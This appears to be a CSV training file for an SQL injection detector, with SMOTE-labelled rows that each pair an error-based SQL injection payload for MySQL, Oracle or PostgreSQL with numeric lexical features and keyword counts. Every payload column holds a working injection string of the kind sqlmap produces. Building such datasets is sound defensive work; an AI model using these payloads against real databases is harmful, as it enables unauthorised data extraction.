id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000025,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000264,0.12360109958652823,276.3347195227541,36.0,4.014850792364757,108.0,35.0,98.92271019520923,34.41200932754484,0.3911727449467078,0.12676894512161827,0.3575736420487746,0.1244846678828994,4.0,0.0,0.0,0.0,2.0,2.0,0.0,18.412009327544833,0.0,2.0,5.0,4.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000026,attack,error, AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,nearest_attack_euclidean,R000018,0.7727072299043799,134.46029230889144,37.08932951710618,4.242522785197382,70.92431520625435,1.0,44.40198282697781,18.13399427565927,0.5297491631485086,0.007634775788658316,0.32787510632547895,0.1347409547373541,3.0,0.0,0.0,0.0,5.551115123125783e-17,2.0,0.0,6.089329517106179,0.0,5.522332379276545,0.0,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000027,attack,error,"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and   (  'szib' like 'szib",nearest_attack_euclidean,R000240,1.855004989588049,184.68523608077066,31.0,3.744622511301146,64.0,24.0,73.23769673397554,23.447539346795107,0.34784502530768974,0.13044188449038363,0.39490366601843274,0.1268094241834939,2.552460653204893,1.4475393467951072,0.0,0.0,5.551115123125783e-17,2.220446049250313e-16,0.0,15.447539346795107,0.0,0.0,4.0,0.0,0.6381151633012232,0.3618848366987768,0.0,-1.3877787807814457e-17,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0000000000000004
SMOTE_000028,attack,error,"1   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  1782  =  1782",nearest_attack_euclidean,R000237,1.6258418426035743,332.53034500342187,36.946965499657814,3.8633348492595787,104.78786199863126,59.21213800136874,131.53034500342184,37.0,0.31577025860108865,0.17786440250311042,0.3949965434027804,0.1113687954930205,1.893930999315631,0.0,0.0,0.0,2.0,2.0,0.0,24.106069000684368,0.0,0.0,6.0,5.0,0.4734827498289078,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000029,attack,error,"-8410"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""xhzr""  =  ""xhzr",nearest_attack_euclidean,R000140,0.7494389818003669,364.8076160769562,36.486625387958426,3.5716710705453107,92.9465015518337,52.0,157.29424146491465,62.56687306020787,0.2552090856525108,0.14268280968596134,0.43064730343167423,0.17146080122985358,0.0,3.9999999999999996,1.0,0.0,5.551115123125783e-17,2.5133746120415745,0.0,32.053498448166295,0.0,0.0,1.0,23.513374612041574,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000030,attack,error,"1""  )   where 5298  =  5298 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --",nearest_attack_euclidean,R000281,0.07229455999838758,348.78498768816246,34.756997537632486,3.659502235299974,94.0,53.0,143.02799015052994,58.756997537632486,0.26951727666511577,0.15196186875799084,0.41006011035685375,0.16846074422003965,0.0,1.0,2.0,0.0,5.551115123125783e-17,3.0,0.0,28.756997537632486,0.0,3.0,0.0,25.0,0.0,1.0,0.9999999999999999,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000031,attack,error,"1""   )    )    as rcse where 4559  =  4559 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000072,0.5057008640671375,180.72781319341516,30.858645910379458,3.8025890687212547,47.43458364151784,43.56541635848216,67.86916728303568,21.858645910379458,0.2624073934279464,0.24126944705351272,0.37537220781194336,0.12095095170659749,0.0,0.8586459103794598,2.0,0.0,5.551115123125783e-17,2.0,0.0,11.858645910379462,0.0,0.0,5.14135408962054,4.0,0.0,0.8586459103794597,0.9999999999999999,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.8586459103794598,0.1413540896205402,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000032,attack,error,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'zenl' like 'zenl",nearest_attack_euclidean,R000124,0.8034845328871056,195.58346352617747,30.67423058852932,3.6452288848970125,58.32576941147068,32.0,79.60615529176543,25.651538822941355,0.2983555737501046,0.1637245783857328,0.406800470148381,0.1311193777157816,4.0,0.0,0.0,0.0,1.0,1.0,0.0,14.651538822941358,0.0,0.0,4.0,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.325769411470679,0.6742305885293212,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000033,attack,error,-6222   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   3230  =  3230,nearest_attack_euclidean,R000084,0.06063861058548339,366.06310504541443,32.960132129592104,3.508699870600894,90.9601321295921,55.78072671275656,159.44184981428944,59.88039638877631,0.24855778212216956,0.15235007511102225,0.4354995067658201,0.16359263600098808,0.0,0.0,0.9800660647960513,0.0,5.551115123125783e-17,2.980066064796051,0.0,31.920264259184204,0.0,3.0,0.0,23.960132129592104,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.9800660647960511,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.980066064796051
SMOTE_000034,attack,error,"-2323""  )   as zgsn where 9274  =  9274 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",nearest_attack_euclidean,R000075,1.3662709144572796,367.6763686355175,34.169092158879366,3.402051346523706,82.50727647663811,56.0,167.16909215887938,62.0,0.224341243150548,0.1523254353612901,0.4546873037667336,0.16864601772142832,0.4154539205603158,0.5845460794396844,3.0,0.0,5.551115123125783e-17,3.0,0.0,33.0,0.0,0.0,0.0,26.0,0.4154539205603156,0.5845460794396844,0.9999999999999999,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000035,attack,error,"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",nearest_attack_euclidean,R000054,0.5382211611783976,188.0665938001566,29.152370542879513,3.8463627371235387,66.60948217151805,37.0,66.15237054287951,18.30474108575903,0.35414239967097255,0.19677314155670672,0.35178615416252645,0.09729830460979436,0.0,0.0,0.30474108575902936,0.0,5.551115123125783e-17,1.0,0.0,12.0,0.0,0.0,5.0,1.3047410857590291,0.0,0.0,0.15237054287951468,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.0
SMOTE_000036,attack,error,"1"" where 6800  =  6800 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000078,0.03954350131156249,166.18670887233364,36.0,3.960386379900787,55.54771178723091,31.0,60.54771178723091,19.09128529787182,0.33418806458681477,0.18662621807823143,0.36428906750265855,0.11489664983229524,0.0,1.0,0.0,0.0,5.551115123125783e-17,1.0,0.0,12.09128529787182,0.0,0.0,4.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0000000000000004
SMOTE_000037,attack,error,-8057'   )    )    as gpue where 4205  =  4205 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,nearest_attack_euclidean,R000201,1.1174602171217267,373.8366193643256,34.58366193643256,3.397671120458302,85.41633806356744,54.75098580929768,171.50197161859535,62.167323872865126,0.22854312702769736,0.14643016700822614,0.4587371571086122,0.16628954885546426,1.0,0.0,2.583661936432561,0.0,5.551115123125783e-17,3.0,0.0,33.58366193643256,0.0,0.0,0.0,25.583661936432556,1.0,0.0,0.9999999999999999,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,0.41633806356743897,0.583661936432561,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000038,attack,error,"1',  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select 1 from generate_series  (  8979,8979,case when   (  8979  =  8979  )   then 1 else 0 end  )   limit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",nearest_attack_euclidean,R000291,0.697467483231546,364.84554811678106,34.334909434423366,3.4455732815503644,91.50827453072267,50.501182075817525,161.50118207581752,61.334909434423366,0.25036063545621606,0.1384622053264502,0.4430236671700068,0.16815349204732694,0.8337273586058412,0.0,0.16627264139415876,0.0,5.551115123125783e-17,1.1662726413941589,0.0,33.83372735860584,0.0,0.8337273586058412,2.501182075817524,21.332545282788317,0.8337273586058412,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.8337273586058412,0.0,0.1662726413941588,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000039,attack,error,"1   )    )    as yfvg where 1454  =  1454 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000224,0.5970310930907371,327.97474369030033,39.521404160980985,4.010504834526566,108.32491456343344,63.0,122.1284249658859,34.521404160980985,0.33028196218998135,0.19223638203117618,0.37221762678401926,0.10526402899482325,0.0,0.0,2.0,0.0,2.0,2.0,0.0,21.521404160980985,0.0,0.0,6.0,7.0,0.0,0.0,0.9999999999999999,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,0.7607020804904918,0.23929791950950816,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000040,attack,error,1'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'smrw' like 'smrw,nearest_attack_euclidean,R000064,0.38948923844898325,375.6855802106512,32.6986891100592,3.527983996561906,102.7947564402368,45.0,164.19213466035518,63.6986891100592,0.27360267543981603,0.1198028915518577,0.4370268779490258,0.1695675550593005,4.0,0.0,0.0,0.0,5.551115123125783e-17,2.3013108899408,0.0,33.3973782201184,0.0,3.0,0.0,22.3013108899408,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000041,attack,error,1   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   5139  =  5139,nearest_attack_euclidean,R000213,1.2425419281683334,442.4691792474455,33.39065566053182,3.3774832063506968,107.12524528425455,55.87475471574545,206.12524528425456,73.3439339631909,0.24202985253966477,0.12644459672723965,0.4658272174318337,0.16569833330126188,1.5626226421272738,0.0,0.0,0.0,5.551115123125783e-17,3.0,0.0,42.78131132106364,0.0,0.0,0.0,29.0,0.3906556605318185,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,8.0
SMOTE_000042,attack,error,-5967 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  # lhoh,nearest_attack_euclidean,R000155,0.6462388948103702,340.2654821726213,33.11857860714555,3.322088257303532,77.55928930357277,47.559289303572776,157.29380713095148,57.85309643452426,0.22792740227494288,0.13975854025478718,0.4622914705571229,0.17002258691314706,0.0,0.0,0.853096434524258,0.0,5.551115123125783e-17,2.0,0.0,32.14690356547574,0.0,0.0,0.0,22.85309643452426,0.0,0.0,0.0,0.853096434524258,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.1469035654757419,0.853096434524258,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000043,attack,error,"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000087,0.9259831899324289,197.81073556240162,33.15283471335189,3.6803194051098522,53.023280997821075,37.74089256893838,81.89372728229026,25.15283471335189,0.2681752353030293,0.19039532792236413,0.41416256094969167,0.12726687582491492,0.7176115711172969,0.0,2.0,0.0,1.0,1.7176115711172968,0.0,14.717611571117295,0.0,0.0,4.0,4.717611571117297,0.7176115711172969,0.0,0.9999999999999999,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.7176115711172968,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.717611571117297
SMOTE_000044,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'pmzp' like 'pmzp",nearest_attack_euclidean,R000113,0.2746026912385733,175.15265938537226,31.549620087803966,3.8301327729141272,51.324430131705945,35.900759824392075,65.25189956098018,22.675569868294055,0.2935691327398745,0.20488208337420005,0.37217770640191733,0.1293710774840081,4.0,0.0,0.0,0.0,5.551115123125783e-17,1.0,0.0,12.450379912196034,0.0,0.0,5.225189956098018,1.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000045,attack,error,-5449' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'ryvy' like 'ryvy,nearest_attack_euclidean,R000172,0.7070097957941759,357.1718288599613,37.601224832175596,3.7030827355777904,101.40489932870238,48.0,146.7730536921369,60.993875839122026,0.28436043152873886,0.13452111576913792,0.41039525282855427,0.170723199873569,4.0,0.0,1.0,0.0,5.551115123125783e-17,2.3987751678244047,0.0,29.595100671297615,0.0,3.0,0.0,23.398775167824404,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000046,attack,error,"1%'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000065,0.3605640598817215,183.65787000888906,27.222588749629622,3.490854579750674,37.66776624888887,38.10964500148151,78.9934025066668,28.887056251851888,0.2061525294439987,0.20763398989685206,0.4290893013635476,0.15712417929560157,4.0,0.0,0.0,0.0,5.551115123125783e-17,2.0,0.0,15.109645001481512,2.0,0.0,5.777411250370378,2.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000047,attack,error,"-8614'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000262,0.1373033520404253,207.6167373163367,39.44860522363861,3.8679031258913836,63.0,37.0,84.51394776361391,23.102789552722783,0.3036962032343164,0.17836126221697945,0.4067124764089365,0.11123005813976765,1.0,0.0,1.0,0.0,1.0,1.0,0.0,15.102789552722784,0.0,0.0,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000048,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",nearest_attack_euclidean,R000100,0.859491427429924,205.05185986579565,30.602592993289782,3.8064469735994373,69.3142614630938,37.0,76.6285229261876,22.109075476514242,0.33850496366907407,0.1817937064414499,0.3723826354632861,0.10731869442618992,1.9038894899346734,0.0,0.0,0.0,5.551115123125783e-17,1.3012964966448912,0.0,13.903889489934674,0.0,0.0,5.0,1.3012964966448903,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.3012964966448912,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,4.301296496644891
